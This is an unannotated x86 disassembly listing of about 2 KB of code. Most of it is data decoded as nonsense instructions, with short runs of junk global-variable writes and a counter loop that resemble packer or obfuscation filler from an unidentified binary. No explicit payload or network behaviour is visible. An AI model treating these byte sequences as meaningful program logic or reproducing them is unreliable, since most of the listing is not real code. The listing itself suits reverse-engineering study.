  40a550:	jle    0x40a56d
  40a552:	mov    ebp,edi
  40a554:	push   edi
  40a555:	push   ebp
  40a556:	dec    ebp
  40a557:	enter  0xc8c7,0x10
  40a55b:	cwde   
  40a55c:	mov    ah,0xbb
  40a55e:	mov    ecx,DWORD PTR [ebp+0x2a7a1300]
  40a564:	lods   al,BYTE PTR ds:[esi]
  40a565:	leave  
  40a566:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a567:	fisub  WORD PTR [esi+0x33326399]
  40a56d:	push   ss
  40a56e:	ins    BYTE PTR es:[edi],dx
  40a56f:	cmp    ah,BYTE PTR [eax]
  40a571:	xor    BYTE PTR [ecx-0x58],0x90
  40a575:	lds    edx,FWORD PTR [esp+edx*2+0x20]
  40a579:	pushf  
  40a57a:	jns    0x40a5f1
  40a57c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a57d:	or     eax,0x30c11c86
  40a582:	pop    eax
  40a583:	and    eax,DWORD PTR [ebx+esi*4-0x6d4adb8a]
  40a58a:	and    al,BYTE PTR [esi+0x14]
  40a58d:	cwde   
  40a58e:	mov    ah,0xb
  40a590:	xlat   BYTE PTR ds:[ebx]
  40a591:	jne    0x40a597
  40a593:	pop    es
  40a594:	push   ebx
  40a595:	mov    ds:0x60c2bea0,al
  40a59a:	pop    es
  40a59b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a59c:	outs   dx,BYTE PTR ds:[esi]
  40a59d:	daa    
  40a59e:	dec    ebp
  40a59f:	popa   
  40a5a0:	mov    WORD PTR [edi-0x62a95d1],?
  40a5a6:	inc    eax
  40a5a7:	sar    BYTE PTR [ecx+0x44de3931],cl
  40a5ad:	aad    0x43
  40a5af:	in     al,dx
  40a5b0:	pop    ds
  40a5b1:	call   0xc54d:0x32dfe37b
  40a5b8:	mov    al,BYTE PTR [eax+0x64a9ae2c]
  40a5be:	inc    edi
  40a5bf:	scas   al,BYTE PTR es:[edi]
  40a5c0:	ret    
  40a5c1:	and    BYTE PTR [esi-0x6c],bh
  40a5c4:	aad    0x2f
  40a5c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5c7:	in     eax,dx
  40a5c8:	pop    ecx
  40a5c9:	rcr    BYTE PTR [edx+eax*4],0xce
  40a5cd:	stos   BYTE PTR es:[edi],al
  40a5ce:	xlat   BYTE PTR ds:[ebx]
  40a5cf:	jb     0x40a5e9
  40a5d1:	dec    eax
  40a5d2:	cmp    dh,BYTE PTR [ebp+0x67]
  40a5d5:	lods   al,BYTE PTR ds:[esi]
  40a5d6:	dec    eax
  40a5d7:	mov    ebx,0x807dbab8
  40a5dc:	jnp    0x40a614
  40a5de:	fldenv [eax+edi*4-0x3b8b475a]
  40a5e5:	mov    ebp,0x846d41c7
  40a5ea:	cmc    
  40a5eb:	jmp    0xbc7c97d5
  40a5f0:	inc    edx
  40a5f1:	cli    
  40a5f2:	cmc    
  40a5f3:	sbb    BYTE PTR [edx+0x4bdbec3f],bl
  40a5f9:	repz shr DWORD PTR [ecx],cl
  40a5fc:	sub    ch,bl
  40a5fe:	(bad)  
  40a5ff:	sti    
  40a600:	sub    al,0x9c
  40a602:	push   esp
  40a603:	lock pusha 
  40a605:	jge    0x40a62d
  40a607:	mov    edi,0xf99e3516
  40a60c:	sahf   
  40a60d:	out    dx,eax
  40a60e:	fnstenv [eax]
  40a610:	mov    dh,BYTE PTR [ecx]
  40a612:	jns    0x40a5ab
  40a614:	pop    ebx
  40a615:	test   al,0x71
  40a617:	daa    
  40a618:	(bad)  
  40a619:	pop    ebx
  40a61a:	mov    bl,0xb4
  40a61c:	add    BYTE PTR [edi-0x77],al
  40a61f:	jge    0x40a631
  40a621:	mov    ecx,0xe45f6a16
  40a626:	jae    0x40a628
  40a628:	dec    edx
  40a629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a62a:	int    0x9c
  40a62c:	adc    edi,ecx
  40a62e:	hlt    
  40a62f:	in     al,dx
  40a630:	in     al,0xff
  40a632:	lahf   
  40a633:	sub    al,0xd5
  40a635:	mov    ds:0x8d2481a2,eax
  40a63a:	pop    edi
  40a63b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a63c:	adc    ebx,DWORD PTR [ebp-0x62]
  40a63f:	sahf   
  40a640:	imul   eax,DWORD PTR [esi-0x6d],0x60
  40a644:	pop    ss
  40a645:	(bad)  
  40a646:	adc    DWORD PTR [esi],ebp
  40a648:	and    cl,BYTE PTR [edi+ebx*8+0x2e7375cf]
  40a64f:	cmp    DWORD PTR [edi+0x146a0fb6],eax
  40a655:	jae    0x40a631
  40a657:	pop    edx
  40a658:	or     ecx,eax
  40a65a:	daa    
  40a65b:	xor    DWORD PTR [edx],0xbb09737c
  40a661:	mov    esp,0x6e8a4ef2
  40a666:	dec    ebp
  40a667:	dec    esp
  40a668:	xchg   esp,eax
  40a669:	jne    0x40a69b
  40a66b:	xchg   esp,eax
  40a66c:	mov    cl,0x97
  40a66e:	jmp    0xa1771198
  40a673:	pop    ecx
  40a674:	inc    ebp
  40a675:	mov    edx,0xf6a2d5f8
  40a67a:	adc    DWORD PTR [esi-0xc],ebx
  40a67d:	jne    0x40a66f
  40a67f:	jae    0x40a6a0
  40a681:	push   ecx
  40a682:	pop    eax
  40a683:	pop    es
  40a684:	or     DWORD PTR [edx-0x67640118],esp
  40a68a:	iret   
  40a68b:	mov    ebx,DWORD PTR [esi-0x61]
  40a68e:	mov    cs,WORD PTR ds:0x43b1ddf6
  40a694:	adc    al,0xc7
  40a696:	jecxz  0x40a67b
  40a698:	lods   eax,DWORD PTR ds:[esi]
  40a699:	imul   ecx,DWORD PTR [esi],0x4e
  40a69c:	out    0x61,al
  40a69e:	fimul  DWORD PTR [ebp+0x6a]
  40a6a1:	out    dx,al
  40a6a2:	add    esi,DWORD PTR [edx-0x30c5275e]
  40a6a8:	repnz push es
  40a6aa:	mov    edx,0xbcd6e301
  40a6af:	xchg   ebx,eax
  40a6b0:	mov    WORD PTR [esi+0x26e1c3df],?
  40a6b6:	pop    esi
  40a6b7:	xchg   BYTE PTR [ecx+0x4],ch
  40a6ba:	xchg   ecx,eax
  40a6bb:	sbb    bh,BYTE PTR [edi]
  40a6bd:	push   ss
  40a6be:	jne    0x40a698
  40a6c0:	mov    dl,0xa4
  40a6c2:	(bad)  
  40a6c3:	sar    BYTE PTR [ebp-0xc41de4],0x18
  40a6ca:	push   eax
  40a6cb:	inc    eax
  40a6cc:	rol    DWORD PTR [edi-0x58],0xbf
  40a6d0:	inc    ebx
  40a6d1:	pusha  
  40a6d2:	sub    DWORD PTR [edx+0x1b639989],ebp
  40a6d8:	enter  0x25eb,0xee
  40a6dc:	push   0xffffff8e
  40a6de:	in     eax,dx
  40a6df:	das    
  40a6e0:	lahf   
  40a6e1:	mov    ds:0xe685a7f0,eax
  40a6e6:	xor    bl,dh
  40a6e8:	jecxz  0x40a67f
  40a6ea:	add    ebx,DWORD PTR [esi-0x3807c43a]
  40a6f0:	add    eax,0x43376b
  40a6f5:	test   al,0x5a
  40a6f7:	add    BYTE PTR [eax],al
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x433757,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x4337e7,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433817
  40a72f:	or     DWORD PTR ds:0x433823,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433813,0x433707
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x4337af,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x433767,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x4337ef,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x4336ff,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x4337db
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43370b
  40a793:	sub    DWORD PTR ds:0x433723,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0xa694ec0c
  40a7ac:	out    0x1f,eax
  40a7ae:	push   ss
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	jo     0x40a792
  40a7b8:	push   es
  40a7b9:	pushf  
  40a7ba:	or     ecx,DWORD PTR [ecx+0x188475af]
  40a7c0:	ds mov ebx,0xcb8fb9dd
  40a7c6:	lock out 0x17,eax
  40a7c9:	daa    
  40a7ca:	and    BYTE PTR [ecx-0x5b805b37],0x2c
  40a7d1:	xor    eax,DWORD PTR [ebp+ecx*8-0x70]
  40a7d5:	pop    edx
  40a7d6:	pop    esp
  40a7d8:	and    eax,0x4431373e
  40a7dd:	ja     0x40a809
  40a7df:	mov    esi,0x698a4828
  40a7e4:	lods   eax,DWORD PTR ds:[esi]
  40a7e5:	or     BYTE PTR [eax-0x2d],al
  40a7e8:	pop    esp
  40a7e9:	sub    ebx,DWORD PTR [ecx+0x67]
  40a7ec:	pushf  
  40a7ed:	inc    BYTE PTR [edi+0x392d4c9d]
  40a7f3:	call   0xf90d:0x1df51e5c
  40a7fa:	xchg   ecx,eax
  40a7fb:	mov    ah,0x2b
  40a7fd:	mov    esi,ebx
  40a7ff:	pop    es
  40a800:	or     al,BYTE PTR [edx+0x286a9c51]
  40a806:	mov    DWORD PTR [ecx+0x6a],esi
  40a809:	daa    
  40a80a:	xor    eax,0x7d70b2d6
  40a80f:	lock lods al,BYTE PTR ds:[esi]
  40a811:	and    eax,0x11d3db16
  40a816:	mov    edx,0x540d0e25
  40a81b:	(bad)  
  40a81d:	gs push eax
  40a81f:	pop    ebx
  40a820:	mov    cs,WORD PTR [edi+0x62264d99]
  40a826:	rcl    BYTE PTR [edi],1
  40a828:	lahf   
  40a829:	mov    ecx,0x530cc2e8
  40a82e:	adc    ebp,eax
  40a830:	jg     0x40a8a4
  40a832:	mov    ah,0x88
  40a834:	push   edx
  40a835:	(bad)  
  40a836:	xor    DWORD PTR [ebx+0x57],eax
  40a839:	hlt    
  40a83a:	mov    bh,0xd2
  40a83c:	ds push cs
  40a83e:	sub    ah,BYTE PTR [ebp+0xb]
  40a841:	jns    0x40a865
  40a843:	mov    DWORD PTR [esi-0x4c16e10a],ebp
  40a849:	pop    ss
  40a84a:	nop
  40a84b:	into   
  40a84c:	fisttp WORD PTR ds:[ebx+0x30]
  40a850:	fwait
  40a851:	and    BYTE PTR [ebp-0x18],cl
  40a854:	dec    ecx
  40a855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a856:	mov    eax,ds:0x93d1bfa
  40a85b:	cmp    eax,0xf01bac6d
  40a860:	xchg   esi,eax
  40a861:	mov    ebx,0x68bedf69
  40a866:	fist   WORD PTR [bp+di-0x457d]
  40a86b:	cdq    
  40a86c:	mov    ah,0xe1
  40a86e:	add    eax,0x2a1a722c
  40a873:	shr    BYTE PTR [esi],1
  40a875:	clc    
  40a876:	stos   DWORD PTR es:[edi],eax
  40a877:	push   edx
  40a878:	xchg   edi,eax
  40a879:	dec    BYTE PTR [ecx]
  40a87b:	mov    dh,0xfd
  40a87d:	popf   
  40a87e:	pop    eax
  40a87f:	into   
  40a880:	(bad)  
  40a882:	push   esi
  40a883:	jp     0x40a834
  40a885:	dec    esi
  40a886:	(bad)  
  40a887:	das    
  40a888:	or     ah,cl
  40a88a:	stos   BYTE PTR es:[edi],al
  40a88b:	jl     0x40a810
  40a88d:	xchg   edi,eax
  40a88e:	fist   DWORD PTR [ebx-0x6a]
  40a891:	test   DWORD PTR [esi-0x4cdca4fd],edx
  40a897:	cli    
  40a898:	add    ebp,DWORD PTR [ecx+0x264ab75e]
  40a89e:	imul   edi,DWORD PTR [ecx-0x14],0xe6233baf
  40a8a5:	test   al,0xfc
  40a8a7:	jae    0x40a900
  40a8a9:	mov    ds:0xe204d64b,eax
  40a8ae:	push   ebp
  40a8af:	int3   
  40a8b0:	xchg   edx,eax
  40a8b1:	inc    ebp
  40a8b2:	and    cl,bl
  40a8b4:	aaa    
  40a8b5:	in     eax,0x30
  40a8b7:	leave  
  40a8b8:	in     eax,dx
  40a8b9:	xchg   BYTE PTR [edi+edi*8],bl
  40a8bc:	out    0x13,al
  40a8be:	cli    
  40a8bf:	jp     0x40a8cb
  40a8c1:	pop    ds
  40a8c2:	xlat   BYTE PTR ds:[ebx]
  40a8c3:	dec    esi
  40a8c4:	jo     0x40a850
  40a8c6:	call   0x9723:0x8ae92a26
  40a8cd:	sub    ch,ch
  40a8cf:	xchg   DWORD PTR [edx-0x22],ebx
  40a8d2:	push   0xfffffffc
  40a8d4:	ds pop ds
  40a8d6:	jge    0x40a93f
  40a8d8:	xor    eax,0xc4ff5a1b
  40a8dd:	mov    ecx,0x13f78c0d
  40a8e2:	cmp    BYTE PTR [ecx+0x78785793],cl
  40a8e8:	js     0x40a8e7
  40a8ea:	jae    0x40a95e
  40a8ec:	popa   
  40a8ed:	mov    eax,ds:0x8bccd10e
  40a8f2:	jmp    0x40a87c
  40a8f4:	cmp    DWORD PTR [esi+ebp*1],ebx
  40a8f7:	sahf   
  40a8f8:	(bad)  
  40a8f9:	sbb    al,0x87
  40a8fb:	dec    edx
  40a8fc:	pop    ebp
  40a8fd:	retf   0xa353
  40a900:	jbe    0x40a91e
  40a902:	dec    ebx
  40a903:	xchg   edx,eax
  40a904:	inc    ebp
  40a905:	xor    al,dl
  40a907:	out    0x1a,al
  40a909:	sbb    eax,0xd9b83b96
  40a90e:	je     0x40a8e9
  40a910:	mul    DWORD PTR [ebx+ebp*1+0x4a]
  40a914:	add    esi,ebp
  40a916:	or     BYTE PTR [edi],dh
  40a918:	dec    ebp
  40a919:	mov    edi,eax
  40a91b:	retf   0x29b8
  40a91e:	add    BYTE PTR [eax],bl
  40a920:	pop    esp
  40a921:	or     al,BYTE PTR [ecx+0x51]
  40a924:	popf   
  40a925:	dec    esp
  40a926:	adc    esi,ecx
  40a928:	neg    DWORD PTR [eax-0x45]
  40a92b:	mov    DWORD PTR [eax+edi*2-0x3a],edi
  40a92f:	jmp    0x96eb:0xeb1659d5
  40a936:	ja     0x40a8c2
  40a938:	or     DWORD PTR fs:[esi+eiz*4+0x67a3c6af],0xf
  40a941:	dec    ecx
  40a942:	sbb    bh,BYTE PTR [ebp-0x45]
  40a945:	rcl    BYTE PTR [ebx],1
  40a947:	inc    ebp
  40a948:	sub    al,0x24
  40a94a:	push   ebx
  40a94b:	sbb    eax,0x45082d66
  40a950:	cmp    DWORD PTR [edx+0x44],esp
  40a953:	mov    BYTE PTR [ebp+esi*8+0x19857601],al
  40a95a:	mov    ah,0xbe
  40a95c:	cmp    ch,BYTE PTR [ebx+0x37991709]
  40a962:	data16 fcom st(3)
  40a965:	adc    eax,0x21b7688b
  40a96a:	gs retf 0x773d
  40a96e:	cld    
  40a96f:	test   DWORD PTR [eax-0x49],ebx
  40a972:	inc    ebx
  40a973:	lahf   
  40a974:	jg     0x40a961
  40a976:	add    ebx,DWORD PTR [ecx+0x0]
  40a979:	mov    ecx,DWORD PTR gs:[ecx-0x52cb99aa]
  40a980:	pop    ss
  40a981:	sub    eax,0x3a9fa5a4
  40a986:	mov    ah,0xba
  40a988:	fs push es
  40a98a:	sbb    ebx,DWORD PTR [ecx-0x18850d62]
  40a990:	jle    0x40a95b
  40a992:	push   esi
  40a993:	mov    ah,cl
  40a995:	ret    0x96f
  40a998:	cmc    
  40a999:	fdivr  QWORD PTR [esi-0x15631668]
  40a99f:	pop    ss
  40a9a0:	call   0x4dd1:0x2ee64966
  40a9a7:	iret   
  40a9a8:	(bad)  
  40a9a9:	inc    edi
  40a9aa:	pop    eax
  40a9ab:	sub    BYTE PTR ds:0x58998681,ch
  40a9b1:	js     0x40a95b
  40a9b3:	in     al,dx
  40a9b4:	fsub   QWORD PTR [ebx+0xaa31c1e]
  40a9ba:	shl    BYTE PTR cs:[edi+0x68736785],cl
  40a9c1:	pop    ds
  40a9c2:	jg     0x40a9a0
  40a9c4:	call   0xd665:0x5ac753ef
  40a9cb:	js     0x40aa17
  40a9cd:	lods   eax,DWORD PTR ds:[esi]
  40a9ce:	mov    ss,WORD PTR [ecx]
  40a9d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9d1:	jmp    0x79885be5
  40a9d6:	or     ah,bh
  40a9d8:	enter  0xdea,0xa3
  40a9dc:	jmp    0xaa602aef
  40a9e1:	push   ds
  40a9e2:	pop    ss
  40a9e3:	sub    ah,dl
  40a9e5:	stc    
  40a9e6:	adc    DWORD PTR [eax+0x60],ebx
  40a9e9:	xchg   edi,eax
  40a9ea:	mov    ecx,0x7f6c991f
  40a9ef:	mov    esp,0x9fddef28
  40a9f4:	xchg   bl,dl
  40a9f6:	mov    dl,0x57
  40a9f8:	std    
  40a9f9:	out    0x86,al
  40a9fb:	cmc    
  40a9fc:	mov    DWORD PTR [ebp-0x14],eax
  40a9ff:	mov    eax,DWORD PTR [ebp-0x4]
  40aa02:	xor    DWORD PTR ds:0x433717,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433817,0x4337e7
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x433767,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	scas   al,BYTE PTR es:[edi]
  40aa35:	mov    ebp,0xebd0e084
  40aa3a:	jle    0x40aaba
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	retf   
  40aa41:	sbb    DWORD PTR [ecx+0x39],edi
  40aa44:	jp     0x40aa66
  40aa46:	outs   dx,BYTE PTR ds:[esi]
  40aa47:	inc    esp
  40aa48:	dec    ebx
  40aa49:	fwait
  40aa4a:	mov    BYTE PTR [edx+ebp*4-0x78],bl
  40aa4e:	mov    bh,0xa9
  40aa50:	sub    eax,0x5dec5e6d
  40aa55:	push   esi
  40aa56:	mov    ecx,DWORD PTR [edi+0x720f87b6]
  40aa5c:	xchg   edx,eax
  40aa5d:	inc    ecx
  40aa5e:	add    BYTE PTR [eax+0x55d8ba57],ch
  40aa64:	inc    ebp
  40aa65:	ret    
  40aa66:	je     0x40aa20
  40aa68:	pop    ds
  40aa69:	xchg   edx,eax
  40aa6a:	push   ebx
  40aa6c:	sub    eax,0x72765dce
  40aa71:	jae    0x40aa7b
  40aa73:	sti    
  40aa74:	(bad)  
  40aa75:	mov    ecx,0x4394d2e1
  40aa7a:	mov    BYTE PTR [ebx],ah
  40aa7c:	mov    edi,DWORD PTR [eax-0x5d]
  40aa7f:	push   ebx
  40aa80:	push   edi
  40aa81:	mov    WORD PTR [eax+0x1d481969],fs
  40aa87:	inc    edi
  40aa88:	sbb    eax,0x3e3444a9
  40aa8d:	xchg   ebp,ebx
  40aa8f:	loope  0x40aa62
  40aa91:	mov    edx,0x58386e63
  40aa96:	maxps  xmm2,XMMWORD PTR [ebp-0x42]
  40aa9a:	pop    esp
  40aa9b:	mov    esp,0xed217137
  40aaa0:	pusha  
  40aaa1:	shr    DWORD PTR [edi-0x6afb5947],1
  40aaa7:	or     ah,al
  40aaa9:	dec    eax
  40aaaa:	pop    esi
  40aaab:	imul   edx,DWORD PTR [ebx+0x68],0xe9217361
  40aab2:	xchg   DWORD PTR [eax-0xa],ebp
  40aab5:	jo     0x40aabe
  40aab7:	xchg   esi,eax
  40aab8:	pushf  
  40aab9:	div    DWORD PTR [esi-0x13]
  40aabc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aabd:	xchg   DWORD PTR [ecx+0x61374cef],eax
  40aac3:	push   ebp
  40aac4:	pop    ss
  40aac5:	pop    ds
  40aac6:	popa   
  40aac7:	sbb    eax,0xb0948868
  40aacc:	(bad)  [ecx-0x72]
  40aacf:	jmp    0x91615599
  40aad4:	and    esi,DWORD PTR [eax]
  40aad6:	mov    eax,ds:0xb4017414
  40aadb:	mov    bl,0x81
  40aadd:	pop    ss
  40aade:	outs   dx,DWORD PTR ds:[esi]
  40aadf:	mov    eax,0x54dff3f1
  40aae4:	jp     0x40ab65
  40aae6:	call   0x7ce62028
  40aaeb:	cdq    
  40aaec:	sub    BYTE PTR [eax+0x75375d56],cl
  40aaf2:	xchg   DWORD PTR [edi+0x1d6677f9],edi
  40aaf8:	jne    0x40ab0e
  40aafa:	xor    DWORD PTR [eax],esp
  40aafc:	xor    al,0xa1
  40aafe:	repnz mov DWORD PTR [edi+0x2492831e],0x792bf4b2
  40ab09:	les    ecx,FWORD PTR [eax+0x6e]
  40ab0c:	(bad)  
  40ab0d:	(bad)  
  40ab0e:	mov    WORD PTR [edi],gs
  40ab10:	scas   al,BYTE PTR es:[edi]
  40ab11:	xchg   BYTE PTR [esi],bl
  40ab13:	in     al,0x2e
  40ab15:	out    dx,al
  40ab16:	dec    ebx
  40ab17:	adc    ebp,0x1e2eff0d
  40ab1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab1e:	dec    eax
  40ab1f:	cli    
  40ab20:	sbb    BYTE PTR [ebx+0x39],0xaf
  40ab24:	shr    DWORD PTR [esi-0x3818ace6],0xbf
  40ab2b:	mov    ebx,0x5c3d5dae
  40ab30:	stos   BYTE PTR es:[edi],al
  40ab31:	mov    ds:0x5bf8e7e8,eax
  40ab36:	sub    eax,0x46d02f8b
  40ab3b:	out    0xf0,al
  40ab3d:	ret    
  40ab3e:	jl     0x40ab27
  40ab40:	adc    eax,0xd6def454
  40ab45:	xchg   edx,eax
  40ab46:	adc    cl,al
  40ab48:	cmp    al,0xec
  40ab4a:	mov    ebx,0xce72f85
  40ab4f:	test   al,0xb7
  40ab51:	out    0x70,al
  40ab53:	aam    0x56
  40ab55:	(bad)  
  40ab56:	sbb    DWORD PTR [esi-0x65],esp
  40ab59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab5a:	fdivr  DWORD PTR [ecx]
  40ab5c:	out    dx,eax
  40ab5d:	mov    bl,0x22
  40ab5f:	push   esi
  40ab60:	adc    BYTE PTR [edi-0x3f3b5612],dh
  40ab66:	jnp    0x40ab2a
  40ab68:	scas   al,BYTE PTR es:[edi]
  40ab69:	jle    0x40abde
  40ab6b:	mov    ebx,0x59cb2215
  40ab70:	bound  ecx,QWORD PTR [edi-0x1b5eda60]
  40ab76:	xor    eax,0xc0ae2492
  40ab7b:	xor    BYTE PTR [edi-0x2511e588],bl
  40ab81:	or     edx,DWORD PTR [eax-0x1d]
  40ab84:	test   al,0x1e
  40ab86:	out    dx,eax
  40ab87:	xor    cl,BYTE PTR [ebx+ebx*1]
  40ab8a:	cmp    al,0xbc
  40ab8c:	push   edi
  40ab8d:	xchg   DWORD PTR [ebp+eax*8-0x74],edi
  40ab91:	jp     0x40ab50
  40ab93:	pop    ds
  40ab94:	scas   eax,DWORD PTR es:[edi]
  40ab95:	sbb    al,0x6
  40ab97:	mov    al,ds:0xf498ab9e
  40ab9c:	sbb    BYTE PTR [ebx+eiz*4],dl
  40ab9f:	xchg   esi,eax
  40aba0:	cdq    
  40aba1:	sbb    dh,cl
  40aba3:	inc    ecx
  40aba4:	adc    eax,ebx
  40aba6:	stc    
  40aba7:	inc    edi
  40aba8:	lock or al,0x53
  40abab:	in     al,0xf
  40abad:	aaa    
  40abae:	int3   
  40abaf:	pop    edi
  40abb0:	add    eax,0xbcd1cdac
  40abb5:	rol    DWORD PTR [eax+0x50d45eea],1
  40abbb:	loop   0x40abe7
  40abbd:	or     al,BYTE PTR [ebx+0x68]
  40abc0:	or     ebp,edi
  40abc2:	sti    
  40abc3:	call   0x8a0e:0x2745badc
  40abca:	lea    edx,[ebp+ebp*8+0xd]
  40abce:	mov    ebx,ds
  40abd0:	cmp    eax,0xff2805b1
  40abd5:	stc    
  40abd6:	mov    bl,0xc2
  40abd8:	or     DWORD PTR [esi+0x61],ebp
  40abdb:	shld   esp,ebp,0xe8
  40abdf:	jmp    DWORD PTR [ebp-0x4e]
  40abe2:	pop    eax
  40abe3:	pop    esi
  40abe4:	cld    
  40abe5:	adc    al,ch
  40abe7:	mov    ah,0xc7
  40abe9:	lock sti 
  40abeb:	loopne 0x40ab9a
  40abed:	(bad)  
  40abee:	loope  0x40abdb
  40abf0:	pusha  
  40abf1:	fcmovnu st,st(3)
  40abf3:	xchg   ecx,eax
  40abf4:	cmp    BYTE PTR [ecx+0x4],dl
  40abf7:	fst    DWORD PTR [eax-0x51]
  40abfa:	or     al,0xb9
  40abfc:	or     eax,0xefe67fc2
  40ac01:	mov    ds:0xbdd22a30,eax
  40ac06:	and    DWORD PTR [eax],ebx
  40ac08:	stc    
  40ac09:	sahf   
  40ac0a:	xchg   edi,eax
  40ac0b:	add    al,0xb8
  40ac0d:	mov    bl,0xbd
  40ac0f:	or     eax,0x984e2d2b
  40ac14:	adc    DWORD PTR [eax*1-0x1da618a9],esp
  40ac1b:	push   cs
  40ac1c:	test   BYTE PTR [ebx-0x46332226],bh
  40ac22:	fidiv  WORD PTR [esi-0x14]
  40ac25:	xchg   edx,eax
  40ac26:	inc    edx
  40ac27:	(bad)  
  40ac28:	addr16 retf 
  40ac2a:	(bad)  [edi+0x19]
  40ac2d:	sbb    al,0x97
  40ac2f:	mov    esp,0xd9573de3
  40ac34:	inc    eax
  40ac35:	jo     0x40ac04
  40ac37:	imul   edx,DWORD PTR [ebp+0xb],0x90fdbd8e
  40ac3e:	and    BYTE PTR [ecx+0x5929c674],ch
  40ac44:	dec    ecx
  40ac45:	jl     0x40ac79
  40ac47:	push   ecx
  40ac48:	mov    ebx,ebp
  40ac4a:	ja     0x40abce
  40ac4c:	ret    0x6ab4
  40ac4f:	sub    eax,edi
  40ac51:	mov    bl,0x28
  40ac53:	and    edi,edx
  40ac55:	pusha  
  40ac56:	packssdw mm5,QWORD PTR [esi+0x61]
  40ac5a:	mov    ah,BYTE PTR [ebp+edx*2-0x18]
  40ac5e:	dec    ebp
  40ac5f:	(bad)  
  40ac60:	rcl    bl,1
  40ac62:	and    dl,cl
  40ac64:	inc    ebx
  40ac65:	mov    ecx,gs
  40ac67:	jo     0x40acab
  40ac69:	les    esi,FWORD PTR [ebx]
  40ac6b:	adc    bl,BYTE PTR [ebx-0x11]
  40ac6e:	pop    ecx
  40ac6f:	outs   dx,DWORD PTR ds:[esi]
  40ac70:	push   0x9966be2f
  40ac75:	sti    
  40ac76:	or     esp,esp
  40ac78:	loopne 0x40ace2
  40ac7a:	mov    eax,0x3c938a34
  40ac7f:	xchg   ecx,eax
  40ac80:	test   eax,0x2ce5d10b
  40ac85:	sti    
  40ac86:	cmp    ecx,eax
  40ac88:	je     0x40b9ed
  40ac8e:	sbb    DWORD PTR ds:0x43376b,0x7413
  40ac98:	mov    eax,DWORD PTR [ebp-0x14]
  40ac9b:	and    DWORD PTR ds:0x4337ef,0x0
  40aca5:	xor    ecx,ecx
  40aca7:	or     ecx,DWORD PTR ds:0x4337ef
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x4337ef,ecx
  40acb4:	cmp    DWORD PTR ds:0x4337ef,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433888
  40acc6:	push   0x4338cc
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x4337ef,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x4337ef
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x4337ef,ecx
  40acf7:	cmp    DWORD PTR ds:0x4337ef,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43379f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi+0x137a473],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40ad5e
  40ad2c:	and    eax,DWORD PTR [edi-0x7b7e3628]
  40ad32:	xchg   ebx,esi
  40ad34:	adc    DWORD PTR [eax+0x1f1ac164],edx
  40ad3a:	jno    0x40acfa
  40ad3c:	mov    edx,0xd7f8369c
  40ad41:	fdivr  DWORD PTR [esi+0x7b]
  40ad44:	fwait
  40ad45:	xchg   esi,eax
  40ad46:	sbb    bl,dl
  40ad48:	in     eax,dx
  40ad49:	mov    ecx,0x6ed6b6f9
  40ad4e:	(bad)  
  40ad4f:	test   DWORD PTR ds:0xc7e6413e,0xfcd8df0a
  40ad59:	fisttp DWORD PTR [eax*2+0x156ef76b]
  40ad60:	fs iret 
